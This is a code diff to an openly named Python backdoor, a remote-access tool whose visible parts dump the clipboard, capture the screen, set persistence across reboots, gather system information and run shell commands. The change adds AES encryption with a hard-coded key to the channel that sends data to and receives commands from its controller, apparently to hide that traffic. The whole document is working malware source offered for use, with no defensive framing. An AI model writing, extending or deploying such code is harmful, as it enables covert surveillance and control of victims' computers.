@@ -1,8 +1,11 @@
 #!/usr/bin/python
 import subprocess, socket, json, os, base64, shutil, sys, platform, ctypes,pyperclip
 from mss import mss
-
+from Crypto.Cipher import AES
 global ip,port,TMP,APPDATA,path,os_type,red,yellow,r
+
+counter = "H"*16
+key = "H"*32
 
 # color codes..................
 red="\033[1;32;31m"
@@ -54,6 +57,33 @@ class Backdoor:
             except socket.error:
                 continue
 
+    def encrypt(self,message):
+        self.encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
+        return self.encrypto.encrypt(message)
+
+    def decrypt(self,message):
+        self.decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
+        return self.decrypto.decrypt(message)
+
+    def json_send(self, data):
+        try:
+            json_data = json.dumps(data)
+            return self.conn.send(self.encrypt(json_data))
+        except:
+            return self.conn.send(self.encrypt("[-] STDOUT parsing problem [-]"))
+            pass
+
+    def receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.conn.recv(4096)
+                return json.loads(self.decrypt(json_data))
+            except ValueError:
+                continue
+            except:
+                pass
+
     # dump clipboard..................
     def clipboard(self):
         try:
@@ -70,13 +100,6 @@ class Backdoor:
         except:
             pass
 
-    def json_send(self, data):
-        try:
-            json_data = json.dumps(data)
-            return self.conn.send(json_data)
-        except:
-            return self.conn.send("[-] STDOUT parsing problem [-]")
-            pass
 
     # make persistence after reboot...........................................
     def persistence(self):
@@ -92,16 +115,7 @@ class Backdoor:
             except:
                 return "[!] failed to set persistance access [!]"
 
-    def receive(self):
-        json_data = ""
-        while True:
-            try:
-                json_data = json_data + self.conn.recv(4096)
-                return json.loads(json_data)
-            except ValueError:
-                continue
-            except:
-                pass
+
 
     def sysinfo(self):
         try:
@@ -411,7 +425,7 @@ class Backdoor:
         for key, value in scheduled_jobs.items():
             try:
                 scheduled_jobs_info += red, "[+] " + key + " [+] \n", r + str(
-                   subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
+                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
             except:
                 pass
 
